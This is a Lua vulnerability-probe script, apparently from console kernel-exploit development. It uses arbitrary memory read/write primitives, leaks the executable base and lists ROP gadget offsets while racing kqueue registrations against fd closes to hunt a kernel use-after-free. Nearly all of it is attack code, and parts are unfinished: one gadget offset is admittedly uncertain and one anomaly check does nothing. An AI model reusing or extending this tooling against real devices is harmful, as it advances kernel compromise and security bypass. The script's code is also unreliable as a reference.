-- CRASH_CLASS: MODERATE
-- PROBE 560a: kqueue + fd close race — UAF hunting
--
-- Theory: register EVFILT_READ knote on fd X via kqueue, then close fd X
-- from a child thread. If there's a race window between close() removing
-- the fd from the fd table and knote_fdclose() cleaning up knotes,
-- we might get a dangling knote → UAF when the knote triggers.
--
-- Setup:
-- 1. Create socketpair (sp0, sp1)
-- 2. Create kqueue, add EVFILT_READ on sp0
-- 3. Child thread: tight loop closing sp0 while main re-opens fds
-- 4. Main: trigger knote by writing to sp1
-- 5. Check for anomalies: wrong fd, kernel panic, leaked data
--
-- Also test: kevent() blocked wait + close(kqueue_fd) from child

print("=== PROBE 560a: KQUEUE CLOSE RACE ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rb(a)
    local d = rd(a); if d == nil then return nil end
    if d < 0 then d = d + 0x100000000 end; return d
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function zero(buf, n)
    for off = 0, n-4, 4 do
        pcall(function() memory.write_dword(buf + off, 0) end)
    end
end
local function write_string(buf, s)
    for i = 1, #s, 4 do
        local b0 = string.byte(s, i) or 0
        local b1 = string.byte(s, i+1) or 0
        local b2 = string.byte(s, i+2) or 0
        local b3 = string.byte(s, i+3) or 0
        wd(buf + (i - 1), b0 + b1 * 256 + b2 * 65536 + b3 * 16777216)
    end
end

local Z = uint64(0)
local sc3   = mk(3)   -- read
local sc4   = mk(4)   -- write
local sc6   = mk(6)   -- close
local sc20  = mk(20)  -- getpid
local sc97  = mk(97)  -- socket
local sc105 = mk(105) -- setsockopt
local sc135 = mk(135) -- socketpair
local sc362 = mk(362) -- kqueue
local sc363 = mk(363) -- kevent
local sc455 = mk(455) -- thr_new
local sc432 = mk(432) -- thr_self
local sc482 = mk(482) -- shm_open
local sc480 = mk(480) -- ftruncate
local sc477 = mk(477) -- mmap
local sc129 = mk(129) -- sysarch (SET_FSBASE)

local pid = N(sc20())
print("pid=" .. pid)

-- Get eboot base for gadgets
local info = memory.alloc(0x200)
zero(info, 0x200)
wd(info, 0x160)
pcall(function() mk(593)(Z, info) end)
local eb_lo = rd(info + 0x108) or 0
local eb_hi = rd(info + 0x10C) or 0
if eb_lo < 0 then eb_lo = eb_lo + 0x100000000 end
if eb_hi < 0 then eb_hi = eb_hi + 0x100000000 end
local eboot = uint64(string.format("0x%X%08X", eb_hi, eb_lo))
print(string.format("eboot=0x%X%08X", eb_hi, eb_lo))

-- Gadgets (from prior probes)
local pop_rax_ret    = eboot + uint64(0x992)
local pop_rdi_ret    = eboot + uint64(0xC9DFE)
local pop_rsi_ret    = eboot + uint64(0xD77D)
local pop_rdx_ret    = eboot + uint64(0x3B02D7)
local pop_rcx_ret    = eboot + uint64(0xE64)
local syscall_ret    = eboot + uint64(0x42)       -- bare syscall; ret
local bare_ret       = eboot + uint64(0x42)       -- actually need the right one
local mov_rdi_rax_ret = eboot + uint64(0x92C67)   -- mov [rdi], rax; ret

-- Need the right syscall;ret gadget
-- From CHAIN_14_10.md: eboot+0x42 is bare ret
-- We need: pop rax; ret → set syscall num → syscall; ret
-- Actually the chain uses: pop_rax_ret(+0x992), then 431 at the syscall gadget
-- Let me use the existing confirmed chain pattern

-- Shared memory for IPC between main and child
local shared = memory.alloc(0x1000)
zero(shared, 0x1000)
-- shared+0: command (0=idle, 1=close_fd, 2=stop)
-- shared+4: target fd to close
-- shared+8: iteration counter
-- shared+12: result of last close
-- shared+16: child alive flag

io.flush()

-- ============================================================
-- TEST 1: Sequential kqueue + close behavior (baseline)
-- ============================================================
print("")
print("=== TEST 1: Sequential baseline ===")
io.flush()

-- Create socketpair
local spf = memory.alloc(8)
pcall(function() sc135(uint64(1), uint64(1), Z, uint64(spf)) end)
local sp0 = rd(spf) or -1
local sp1 = rd(spf + 4) or -1
print(string.format("socketpair fds=%d,%d", sp0, sp1))

-- Create kqueue
local ok_kq, kqfd = pcall(function() return sc362() end)
kqfd = ok_kq and N(kqfd) or -1
print("kqueue=" .. kqfd)

if kqfd >= 0 and sp0 >= 0 then
    -- Add EVFILT_READ on sp0
    local kev = memory.alloc(64)
    zero(kev, 32)
    wq(kev + 0, uint64(sp0))     -- ident = fd
    -- EVFILT_READ = -1 = 0xFFFF, EV_ADD = 0x0001
    wd(kev + 8, 0x0001FFFF)
    wd(kev + 12, 0)
    wq(kev + 16, Z)
    wq(kev + 24, uint64(0xAAAA1111))

    local ok_ka, rv_ka = pcall(function()
        return sc363(uint64(kqfd), uint64(kev), uint64(1), Z, Z, Z)
    end)
    print("  add EVFILT_READ: " .. (ok_ka and N(rv_ka) or -999))

    -- Write to sp1 to trigger the knote
    local wbuf = memory.alloc(8)
    wd(wbuf, 0xDEADBEEF)
    pcall(function() sc4(uint64(sp1), uint64(wbuf), uint64(4)) end)

    -- Poll kevent (non-blocking: timeout=0)
    local ts = memory.alloc(16)
    zero(ts, 16) -- tv_sec=0, tv_nsec=0
    local out_kev = memory.alloc(64)
    zero(out_kev, 64)

    local ok_kp, rv_kp = pcall(function()
        return sc363(uint64(kqfd), Z, Z, uint64(out_kev), uint64(1), uint64(ts))
    end)
    local kprv = ok_kp and N(rv_kp) or -999
    local out_ident = rb(out_kev) or 0
    local out_filter = rb(out_kev + 8) or 0
    local out_data_lo = rb(out_kev + 16) or 0
    print(string.format("  kevent poll: rv=%d ident=%d filter=0x%08X data=%d",
        kprv, out_ident, out_filter, out_data_lo))

    -- Now close sp0 and see what happens to the knote
    pcall(function() sc6(uint64(sp0)) end)
    print("  closed sp0")

    -- Try to poll again — should get EV_ERROR or nothing
    zero(out_kev, 64)
    local ok_kp2, rv_kp2 = pcall(function()
        return sc363(uint64(kqfd), Z, Z, uint64(out_kev), uint64(1), uint64(ts))
    end)
    local kp2rv = ok_kp2 and N(rv_kp2) or -999
    local out2_ident = rb(out_kev) or 0
    local out2_filter = rb(out_kev + 8) or 0
    print(string.format("  after close poll: rv=%d ident=%d filter=0x%08X",
        kp2rv, out2_ident, out2_filter))

    -- Try adding a knote for the same fd (now closed)
    zero(kev, 32)
    wq(kev + 0, uint64(sp0))
    wd(kev + 8, 0x0001FFFF) -- EV_ADD + EVFILT_READ
    local ok_ka2, rv_ka2 = pcall(function()
        return sc363(uint64(kqfd), uint64(kev), uint64(1), Z, Z, Z)
    end)
    print("  add knote on closed fd: " .. (ok_ka2 and N(rv_ka2) or -999))
end

pcall(function() sc6(uint64(kqfd)) end)
pcall(function() sc6(uint64(sp1)) end)
io.flush()

-- ============================================================
-- TEST 2: kqueue fd reuse race — close sp0, reopen new socket
--         at same fd number, check if knote fires on new object
-- ============================================================
print("")
print("=== TEST 2: fd reuse race ===")
io.flush()

for attempt = 1, 10 do
    -- Create socketpair
    local sf = memory.alloc(8)
    pcall(function() sc135(uint64(1), uint64(1), Z, uint64(sf)) end)
    local s0 = rd(sf) or -1
    local s1 = rd(sf + 4) or -1

    -- Create kqueue + add EVFILT_READ on s0
    local ok_q, qfd = pcall(function() return sc362() end)
    qfd = ok_q and N(qfd) or -1

    if qfd < 0 or s0 < 0 then break end

    local kv = memory.alloc(64)
    zero(kv, 32)
    wq(kv + 0, uint64(s0))
    wd(kv + 8, 0x0001FFFF)
    wq(kv + 24, uint64(0xBBBB0000 + attempt))
    pcall(function() sc363(uint64(qfd), uint64(kv), uint64(1), Z, Z, Z) end)

    -- Close s0 — frees the fd slot
    pcall(function() sc6(uint64(s0)) end)

    -- Immediately create new socket — should reuse fd number
    local ok_ns, new_fd = pcall(function()
        return sc97(uint64(2), uint64(2), uint64(17))
    end)
    new_fd = ok_ns and N(new_fd) or -1

    local reused = (new_fd == s0)

    if reused then
        -- The new socket got the same fd as s0
        -- The kqueue knote was registered on fd s0 (EVFILT_READ)
        -- Does the knote now monitor the NEW socket?

        -- Send data to the UDP socket to make it readable
        -- (For UDP, we'd need to bind+sendto, which is complex)
        -- Instead, check if kevent returns anything

        local ts2 = memory.alloc(16)
        zero(ts2, 16)
        local ok2 = memory.alloc(64)
        zero(ok2, 64)

        local ok_p3, rv_p3 = pcall(function()
            return sc363(uint64(qfd), Z, Z, uint64(ok2), uint64(1), uint64(ts2))
        end)
        local p3rv = ok_p3 and N(rv_p3) or -999
        local p3_ident = rb(ok2) or 0
        local p3_flags = rb(ok2 + 8) or 0

        if attempt <= 3 or p3rv > 0 then
            print(string.format("  attempt %d: s0=%d new=%d reused=%s poll=%d ident=%d flags=0x%X",
                attempt, s0, new_fd, tostring(reused), p3rv, p3_ident, p3_flags))
        end

        pcall(function() sc6(uint64(new_fd)) end)
    else
        if attempt <= 3 then
            print(string.format("  attempt %d: s0=%d new=%d (NOT reused)", attempt, s0, new_fd))
        end
        if new_fd >= 0 then pcall(function() sc6(uint64(new_fd)) end) end
    end

    pcall(function() sc6(uint64(qfd)) end)
    pcall(function() sc6(uint64(s1)) end)
end
io.flush()

-- ============================================================
-- TEST 3: Mass kqueue+close with anomaly detection
-- ============================================================
print("")
print("=== TEST 3: Mass race iterations ===")
io.flush()

local anomalies = 0
local total = 0
local eof_events = 0

for iter = 1, 200 do
    local sf3 = memory.alloc(8)
    local ok_s3, rv_s3 = pcall(function()
        return sc135(uint64(1), uint64(1), Z, uint64(sf3))
    end)
    if not ok_s3 or N(rv_s3) ~= 0 then break end
    local s0 = rd(sf3) or -1
    local s1 = rd(sf3 + 4) or -1

    local ok_q3, qfd3 = pcall(function() return sc362() end)
    qfd3 = ok_q3 and N(qfd3) or -1
    if qfd3 < 0 then
        pcall(function() sc6(uint64(s0)) end)
        pcall(function() sc6(uint64(s1)) end)
        break
    end

    -- Add EVFILT_READ + EV_CLEAR (edge-triggered)
    local kv3 = memory.alloc(64)
    zero(kv3, 32)
    wq(kv3 + 0, uint64(s0))
    -- EV_ADD|EV_CLEAR = 0x0001|0x0020 = 0x0021, EVFILT_READ = 0xFFFF
    wd(kv3 + 8, 0x0021FFFF)
    wq(kv3 + 24, uint64(0xCCCC0000 + iter))
    pcall(function() sc363(uint64(qfd3), uint64(kv3), uint64(1), Z, Z, Z) end)

    -- Write data to s1 (makes s0 readable → knote fires)
    local wb3 = memory.alloc(8)
    wd(wb3, 0x41414141 + iter)
    pcall(function() sc4(uint64(s1), uint64(wb3), uint64(4)) end)

    -- Close s1 (writer end) — this sends EOF to s0
    pcall(function() sc6(uint64(s1)) end)

    -- Now close s0 while checking kevent
    -- First poll — should see EOF/data
    local ts3 = memory.alloc(16)
    zero(ts3, 16)
    local ok3 = memory.alloc(64)
    zero(ok3, 64)

    local ok_p4, rv_p4 = pcall(function()
        return sc363(uint64(qfd3), Z, Z, uint64(ok3), uint64(1), uint64(ts3))
    end)
    local p4rv = ok_p4 and N(rv_p4) or -999

    -- Close s0 RIGHT AFTER polling
    pcall(function() sc6(uint64(s0)) end)

    total = total + 1

    if p4rv > 0 then
        local ev_ident = rb(ok3) or 0
        local ev_flags = rb(ok3 + 8) or 0
        local ev_data = rb(ok3 + 16) or 0
        local ev_udata_lo = rb(ok3 + 24) or 0
        local ev_udata_hi = rb(ok3 + 28) or 0

        -- EV_EOF = 0x8000 in flags field (hi 16 bits of the dword at +8)
        local flags_hi = math.floor(ev_flags / 0x10000)
        if flags_hi >= 0x8000 then eof_events = eof_events + 1 end

        -- Check for anomalies:
        -- 1. ident doesn't match our fd
        if ev_ident ~= s0 + 0x100000000 and ev_ident ~= s0 then
            -- Might be because of unsigned representation
            local ev_ident_signed = ev_ident
            if ev_ident > 0x80000000 then ev_ident_signed = ev_ident - 0x100000000 end
        end

        -- 2. udata doesn't match what we set
        local expected_udata = 0xCCCC0000 + iter
        if expected_udata > 0xFFFFFFFF then expected_udata = expected_udata - 0x100000000 end
        if ev_udata_lo ~= expected_udata and ev_udata_lo ~= 0 then
            anomalies = anomalies + 1
            if anomalies <= 5 then
                print(string.format("  ANOMALY iter %d: udata=0x%08X%08X expect=0x%08X",
                    iter, ev_udata_hi, ev_udata_lo, expected_udata))
            end
        end

        -- 3. Kernel pointer in event data?
        if ev_udata_hi >= 0xFFFF8000 then
            anomalies = anomalies + 1
            print(string.format("  KPTR! iter %d: udata=0x%08X%08X",
                iter, ev_udata_hi, ev_udata_lo))
        end
    end

    -- Poll again after close — knote should be gone
    zero(ok3, 64)
    local ok_p5, rv_p5 = pcall(function()
        return sc363(uint64(qfd3), Z, Z, uint64(ok3), uint64(1), uint64(ts3))
    end)
    local p5rv = ok_p5 and N(rv_p5) or -999
    if p5rv > 0 then
        local ev5_ident = rb(ok3) or 0
        local ev5_flags = rb(ok3 + 8) or 0
        anomalies = anomalies + 1
        if anomalies <= 5 then
            print(string.format("  POST-CLOSE EVENT iter %d: ident=%d flags=0x%X",
                iter, ev5_ident, ev5_flags))
        end
    end

    pcall(function() sc6(uint64(qfd3)) end)
end

print(string.format("  total=%d eof_events=%d anomalies=%d", total, eof_events, anomalies))
io.flush()

print("")
local pid2 = N(sc20())
print("pid=" .. pid2 .. (pid2 == pid and " OK" or " DEAD"))
print("=== 560a DONE ===")
